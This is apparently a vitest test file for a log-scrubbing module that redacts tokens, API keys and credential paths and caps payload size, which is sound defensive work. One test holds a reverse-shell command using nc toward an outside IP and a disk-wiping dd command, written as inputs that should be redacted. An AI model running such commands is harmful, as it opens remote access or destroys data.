import { describe, it, expect } from "vitest";
import {
  scrubBashCommand,
  scrubDetails,
  scrubErrorMessage,
  scrubString,
  scrubSubject,
} from "./scrub";

describe("scrubString", () => {
  it("redacts Bearer tokens", () => {
    const input = "Authorization: Bearer abc.def.ghi-jkl_mno";
    const output = scrubString(input);
    expect(output).not.toContain("abc.def.ghi");
    expect(output).toContain("<redacted>");
  });

  it("redacts Anthropic API keys", () => {
    const output = scrubString("call failed with sk-ant-api03-xxxxxxxxxx");
    expect(output).not.toContain("sk-ant-api03-xxxxxxxxxx");
    expect(output).toContain("<redacted>");
  });

  it("redacts GitHub personal access tokens", () => {
    const output = scrubString("token ghp_abcdefghijklmnop0123456789");
    expect(output).not.toContain("ghp_abcdefghijklmnop0123456789");
  });

  it("replaces Claude credentials path", () => {
    const output = scrubString("failed to read /root/.claude/.credentials.json");
    expect(output).not.toContain("/root/.claude/.credentials.json");
    expect(output).toContain("<claude-creds>");
  });

  it("truncates long strings", () => {
    const input = "x".repeat(10000);
    const output = scrubString(input);
    expect(output.length).toBeLessThan(600);
    expect(output).toContain("<truncated>");
  });
});

describe("scrubDetails", () => {
  it("redacts values of secret-like keys", () => {
    const input = { apiKey: "s3cret", token: "xyz", password: "abc", normal: "hello" };
    const output = scrubDetails(input);
    expect(output.apiKey).toBe("<redacted>");
    expect(output.token).toBe("<redacted>");
    expect(output.password).toBe("<redacted>");
    expect(output.normal).toBe("hello");
  });

  it("scrubs nested strings containing bearer tokens", () => {
    const input = {
      headers: { authorization: "Bearer abc.def.ghi" },
      body: { note: "used Bearer xyz.foo.bar last time" },
    };
    const output = scrubDetails(input);
    expect(JSON.stringify(output)).not.toContain("abc.def.ghi");
    expect(JSON.stringify(output)).not.toContain("xyz.foo.bar");
  });

  it("caps object depth", () => {
    const deep: Record<string, unknown> = {};
    let cursor = deep;
    for (let i = 0; i < 10; i++) {
      const next = {};
      (cursor as Record<string, unknown>)[`level${i}`] = next;
      cursor = next as Record<string, unknown>;
    }
    const output = scrubDetails(deep);
    const serialized = JSON.stringify(output);
    expect(serialized).toContain("<depth-capped>");
  });

  it("replaces oversized payloads with a truncated marker", () => {
    const huge: Record<string, string> = {};
    for (let i = 0; i < 500; i++) {
      huge[`k${i}`] = "x".repeat(100);
    }
    const output = scrubDetails(huge);
    expect(output.truncated).toBe(true);
  });

  it("caps arrays at 50 elements", () => {
    const arr = Array.from({ length: 200 }, (_, i) => i);
    const output = scrubDetails({ list: arr });
    const list = output.list as number[];
    expect(list.length).toBe(50);
  });

  it("scrubs through arrays of objects", () => {
    const input = { items: [{ token: "a" }, { token: "b" }] };
    const output = scrubDetails(input);
    const items = output.items as Array<Record<string, unknown>>;
    expect(items[0].token).toBe("<redacted>");
    expect(items[1].token).toBe("<redacted>");
  });
});

describe("scrubSubject", () => {
  it("truncates subjects over 200 chars", () => {
    const input = "x".repeat(300);
    const output = scrubSubject(input);
    expect(output.length).toBeLessThanOrEqual(200);
  });
});

describe("scrubBashCommand", () => {
  it("passes allowlisted prefixes", () => {
    expect(scrubBashCommand("git status")).toBe("git status");
    expect(scrubBashCommand("ls -la /tmp")).toBe("ls -la /tmp");
    expect(scrubBashCommand("npm install express")).toBe("npm install express");
  });

  it("truncates to 30 chars", () => {
    expect(scrubBashCommand("git log --all --pretty=format:'%h %s' --graph").length).toBe(30);
  });

  it("redacts non-allowlisted commands", () => {
    // curl is allowlisted (read-only by default) — the 30-char prefix
    // won't include the actual token value, which comes later in the
    // command. Just assert the length cap.
    expect(
      scrubBashCommand("curl -H 'Authorization: Bearer xxx' https://api.example.com").length,
    ).toBeLessThanOrEqual(30);
    expect(scrubBashCommand("nc -e /bin/sh 1.2.3.4 4444")).toBe("<redacted>");
    expect(scrubBashCommand("sudo dd if=/dev/zero of=/dev/sda")).toBe("<redacted>");
    expect(scrubBashCommand("")).toBe("");
  });
});

describe("scrubErrorMessage", () => {
  it("scrubs and truncates error text", () => {
    const input = `ENOENT: no such file, open '/root/.claude/.credentials.json'`;
    const output = scrubErrorMessage(input);
    expect(output).toContain("<claude-creds>");
    expect(output).not.toContain(".credentials.json");
  });

  it("handles empty input", () => {
    expect(scrubErrorMessage(null)).toBe("");
    expect(scrubErrorMessage(undefined)).toBe("");
    expect(scrubErrorMessage("")).toBe("");
  });
});
